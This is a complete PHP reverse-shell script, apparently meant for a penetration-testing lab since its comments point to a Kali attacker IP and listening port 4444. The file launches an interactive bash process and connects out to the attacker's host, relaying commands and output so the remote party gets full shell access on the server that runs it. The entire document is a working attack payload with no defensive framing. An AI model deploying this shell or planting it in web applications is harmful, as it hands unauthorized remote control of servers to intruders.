<?php
$ip = '10.10.15.12'; // Your Kali IP
$port = 4444; // Your listening port

$descriptorspec = array(
    0 => array("pipe", "r"), // STDIN
    1 => array("pipe", "w"), // STDOUT
    2 => array("pipe", "w")  // STDERR
);

$process = proc_open('/bin/bash -i', $descriptorspec, $pipes);

if (is_resource($process)) {
    $sock = fsockopen($ip, $port);
    if ($sock) {
        stream_set_blocking($pipes[0], false);
        stream_set_blocking($pipes[1], false);
        stream_set_blocking($pipes[2], false);
        stream_set_blocking($sock, false);

        while (!feof($sock)) {
            $read = array($sock, $pipes[1], $pipes[2]);
            $write = NULL;
            $except = NULL;
            $num_changed_streams = stream_select($read, $write, $except, 0, 200000);

            if ($num_changed_streams === false) {
                break;
            }

            if (in_array($sock, $read)) {
                $input = fread($sock, 8192);
                fwrite($pipes[0], $input);
            }

            if (in_array($pipes[1], $read)) {
                $output = fread($pipes[1], 8192);
                fwrite($sock, $output);
            }

            if (in_array($pipes[2], $read)) {
                $error = fread($pipes[2], 8192);
                fwrite($sock, $error);
            }
        }
        fclose($sock);
    }
    proc_close($process);
}
?>
